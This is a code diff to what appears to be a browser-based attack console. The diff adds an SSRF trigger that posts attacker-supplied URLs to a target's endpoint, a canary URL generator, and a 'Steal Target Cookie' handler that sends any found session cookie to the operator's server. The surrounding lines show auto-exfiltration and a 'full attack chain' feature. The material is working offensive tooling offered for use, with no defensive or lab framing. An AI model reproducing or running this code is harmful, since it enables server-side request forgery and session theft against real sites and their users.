@@ -42,6 +42,21 @@
 <div class="row"><label><input type="checkbox" id="autoExfil" checked /> Auto-send results to server</label></div>
 </div>
 
+<div class="row">
+  <label>SSRF Canary URL:</label>
+  <input id="canaryUrl" size="60" readonly>
+  <button id="genCanary">Generate</button>
+</div>
+
+<div class="section">
+  <h3>Next.js SSRF Test (Server Component)</h3>
+  <div class="row">
+    <label>Payload URL (inject into fetch):</label>
+    <input id="ssrfPayload" size="70" value="">
+  </div>
+  <button id="triggerSSRF">Trigger SSRF</button>
+</div>
+
 <!-- Attack Methods -->
 <div class="section">
 <h3>Attack Methods</h3>
@@ -56,6 +71,7 @@
 <button id="proxyFetch">Use Server Proxy (Bypass CORS)</button>
 <button id="directCorsTest">Direct CORS Test (credentials)</button>
 <button id="automatedExfil">Full Attack Chain</button>
+<button id="stealCookie">Steal Target Cookie</button>
 </div>
 </div>
 
@@ -298,7 +314,51 @@ async function batchEndpointScan(base, cn, cv) { /* same – omitted */ return [
 
 // ---------------------------------------------------------------------------
 // BUTTON HANDLERS (all fixed)
-// ---------------------------------------------------------------------------
+
+document.getElementById('triggerSSRF').onclick = async () => {
+  const payload = document.getElementById('ssrfPayload').value.trim();
+  if (!payload) return log('Enter payload', 'error');
+  
+  const target = document.getElementById('target').value.trim() + '/api/ssrf-test';
+  const body = JSON.stringify({ url: payload });
+
+  log(`Sending SSRF payload → ${target}`, 'warning');
+  try {
+    const r = await fetch(target, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body,
+      credentials: 'include'
+    });
+    const txt = await r.text();
+    log(`Response: ${r.status} ${txt.slice(0,200)}`, r.ok ? 'success' : 'warning');
+  } catch (e) {
+    log(`Request failed: ${e.message}`, 'error');
+  }
+};
+
+document.getElementById('genCanary').onclick = () => {
+  const id = crypto.randomUUID();
+  const url = `${getServerUrl()}/canary/${id}`;
+  document.getElementById('canaryUrl').value = url;
+  log(`Canary ready: ${url}`, 'success');
+};// ---------------------------------------------------------------------------
+
+
+document.getElementById('stealCookie').onclick = async () => {
+  const target = document.getElementById('target').value.trim();
+  const cookieName = document.getElementById('cookieName').value.trim();
+  try {
+    const r = await fetch(`${target}/`, { credentials: 'include', mode: 'cors' });
+    const cookies = document.cookie;
+    const stolen = cookies.split(';').find(c => c.trim().startsWith(`${cookieName}=`));
+    log(`Cookie found: ${stolen || '(none)'}`, stolen ? 'success' : 'warning');
+    if (stolen) await exfiltrateToServer({ type: 'cookie_theft', cookie: stolen });
+  } catch (e) {
+    log('CORS blocked (expected)', 'warning');
+  }
+};
+
 document.getElementById('basicInjection').onclick = async () => {
   clear(); const c = getConfig(); setStatus('Basic…','info');
   const r = await cookieInjectionAttack(c);
